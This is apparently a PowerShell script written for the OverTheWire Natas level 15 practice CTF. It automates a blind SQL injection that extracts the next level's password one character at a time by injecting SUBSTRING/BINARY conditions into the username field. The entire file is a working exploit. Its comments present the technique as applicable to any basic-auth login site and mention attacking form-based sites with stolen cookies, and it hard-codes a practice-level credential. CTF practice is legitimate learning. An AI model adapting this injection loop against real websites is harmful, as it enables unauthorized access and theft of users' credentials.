
<# SSgt Michael Wallace 
This script is a website SQL injection Brute force. The website in use is a practice Site for NATAS15 a high level CTF website.
The concepts of this script could be applied to any basic authentication login website. The commented out headers section could be used to attack a form based 
website using stolen cookies or using the $form.fields to input multiple username/password combinations. 

#>



#Creating an array of all characters in the password policy. This information can be found out from an organization's security team pretty easily. 
#Allcharacters to brute force
$characters = @{}
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


#Setting user credentials for basic authentication (Hard coded)
$User = "natas15"
$Password = ConvertTo-SecureString -String "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password


#password container and counter creation using for iterating through the password characters (These are for bruteforcing). 
$password = ""
$count = 0
$substring = 1

#WebRequest header information (These headers can be anything you want or any hidden form fields a website might have)
#$head = @{}
#$head["Authorization"] = 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
#$head["Accept-Encoding"] = 'gzip,deflate'
#$head["User-Agent"] = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
#$head["Cookie"] = 'BCSI-CS-e65b130ea0b290f1=2'
#$head["Referer"] = 'http://natas15.natas.labs.overthewire.org/'
#$head["Content-Type"] = 'application/x-www-form-urlencoded'
#$head["Accept"] = 'text/html,application/xhtml+xml,application/xml;q$0.9,*/*;q=0.8'


#______________________________________________________________________________________________________________________#
#                                                                                                                      #
#Begining Actions                                                                                                      #
#                                                                                                                      #
#______________________________________________________________________________________________________________________#
# Trying to Login to to the website
#initial request to website is saved to the Session variable $sv also uses the $Credential for login

try { $r = Invoke-WebRequest -Uri natas15.natas.labs.overthewire.org/index.php -Method Post -SessionVariable sv  -Credential $Credential
} 
catch { write-host I wasn''t able to connect to the site stopping program

break; 

}

#body information is now saved in The $form variable using the array of the request.Forms attribute
#Test Check for SQL injection is $form.Fields["username"]='natas16" AND LENGTH(password) = "32'
#saving the Request.forms to a variable allows us to interact directly with the website's form information

$form = $r.Forms[0]

#Looping through all characters one at a time and comparing the binary value in SQL. The Binary command in SQL insures the password we have is case sensitive. 
#When found adding to the $password and outputing total result so far, then incrementing the character being checked in the SQL statement. 

   while ($count -lt 62 -and $substring -lt 33){

   #the form.fields["username"] is the username field on the website this could be any field such as a password or search box. 

$form.Fields["username"]="natas16`" AND SUBSTRING(password,$substring,1) = BINARY `"" + $characters[$count]

write-host "Trying character" + $characters[$count]

#Attempting to input the SQL injection in the forms field. I am using the -Body of my request for my input. I am using the WebSession of $sv from earlier to loop my requests. 
try {$r = Invoke-WebRequest -Uri ("natas15.natas.labs.overthewire.org/" + $form.Action) -WebSession $sv -Method Post -Body $form.Fields -Credential $Credential

}
catch { 

#If I get an error I reset my variables and try to reconnect. I also reduce the count increment and let the loop continue until I can get a successful connection. 
write-host something happened let me try something else reconnecting...
    $count = $count - 1
       #clearing my session variable below. 
    $sv = New-Object -TypeName Microsoft.PowerShell.Commands.WebRequestSession
    $r = Invoke-WebRequest -Uri natas15.natas.labs.overthewire.org/index.php -Method Post -SessionVariable sv -Credential $Credential
    $form = $r.Forms[0]
    $form.Fields["username"]="natas16`" AND SUBSTRING(password,$substring,1) = BINARY `"" + $characters[$count]
    $r = Invoke-WebRequest -Uri ("natas15.natas.labs.overthewire.org/" + $form.Action) -WebSession $sv -Method Post -Body $form.Fields -Credential $Credential
    
}

#Checking if my response packet contains a specific string. This could be any successful login notification from the website. 
if($r.Content.Contains("This user exists")){
     $password = $password + $characters[$count]
     write-host I found a character its $characters[$count]
     write-host the password so far is $password
    
    $substring++
    $count = 0
    }

else{$count++}

}
